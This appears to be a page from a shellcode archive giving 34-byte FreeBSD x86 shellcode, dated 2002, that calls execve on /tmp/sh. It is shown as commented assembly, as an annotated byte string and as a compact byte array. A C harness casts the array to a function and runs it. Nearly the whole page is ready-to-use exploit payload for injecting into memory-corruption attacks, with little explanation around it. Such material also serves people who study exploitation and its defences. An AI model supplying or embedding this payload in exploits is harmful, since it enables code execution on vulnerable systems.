<html><head><title>FreeBSD/x86 - execve /tmp/sh - 34 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * FreeBSD shellcode - execve /tmp/sh
 * 
 * Claes M. Nyberg 20020120
 *
 * &lt; cmn@darklab.org &gt;, &lt; md0claes@mdstud.chalmers.se &gt;
 */

/**********************************************************
void
main()
{
__asm__(&quot;
        xorl    %eax, %eax   # eax = 0
        pushl   %eax         # string ends with NULL
        pushl   $0x68732f2f  # push 'hs//' (//sh)
        pushl   $0x706d742f  # push 'pmt/' (/tmp)
        movl    %esp, %ebx   # ebx = argv[0] = string addr
        pushl   %eax         # argv[1] = NULL
        pushl   %ebx         # argv[0] = /bin//sh
        movl    %esp, %edx   # edx = &amp;argv[0]
        
        pushl   %eax         # envp = NULL
        pushl   %edx         # &amp;argv[0]
        pushl   %ebx         # *path = argv[0]
        pushl   %eax         # Dummy
        movb    $0x3b, %al   # al = 59 = execve
        int     $0x80        # execve(argv[0], argv, NULL)

        xorl    %eax, %eax   # eax = 0
        inc     %eax         # eax++
        pushl   %eax         # Exit value = 1
        pushl   %eax         # Dummy
        int     $0x80        # exit(1); (eax is 1 = execve)
    &quot;);
}
************************************************************/

#include &quot;stdio.h&quot;
#include &quot;string.h&quot;

static char freebsd_code[] =
    &quot;\x31\xc0&quot;               /* xorl    %eax, %eax  */
    &quot;\x50&quot;                   /* pushl   %eax        */
    &quot;\x68\x2f\x2f\x73\x68&quot;   /* pushl   $0x68732f2f */
    &quot;\x68\x2f\x74\x6d\x70&quot;   /* pushl   $0x706d742f */
    &quot;\x89\xe3&quot;               /* movl    %esp, %ebx  */
    &quot;\x50&quot;                   /* pushl   %eax        */
    &quot;\x53&quot;                   /* pushl   %ebx        */
    &quot;\x89\xe2&quot;               /* movl    %esp, %edx  */
    &quot;\x50&quot;                   /* pushl   %eax        */     
    &quot;\x52&quot;                   /* pushl   %edx        */    
    &quot;\x53&quot;                   /* pushl   %ebx        */
    &quot;\x50&quot;                   /* pushl   %eax        */
    &quot;\xb0\x3b&quot;               /* movb    $0x3b, %al  */
    &quot;\xcd\x80&quot;               /* int     $0x80       */
    &quot;\x31\xc0&quot;               /* xorl    %eax, %eax  */
    &quot;\x40&quot;                   /* inc     %eax        */ 
    &quot;\x50&quot;                   /* pushl   %eax        */
    &quot;\x50&quot;                   /* pushl   %eax        */
    &quot;\xcd\x80&quot;;              /* int     $0x80       */


static char _freebsd_code[] =
    &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68&quot;
    &quot;\x68\x2f\x74\x6d\x70\x89\xe3\x50&quot;
    &quot;\x53\x89\xe2\x50\x52\x53\x50\xb0&quot;
    &quot;\x3b\xcd\x80\x31\xc0\x40\x50\x50&quot;
    &quot;\xcd\x80&quot;;

void
main(void)
{
	void (*code)() = (void *)freebsd_code;
	printf(&quot;strlen code: %d\n&quot;, strlen(freebsd_code));
	code();
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
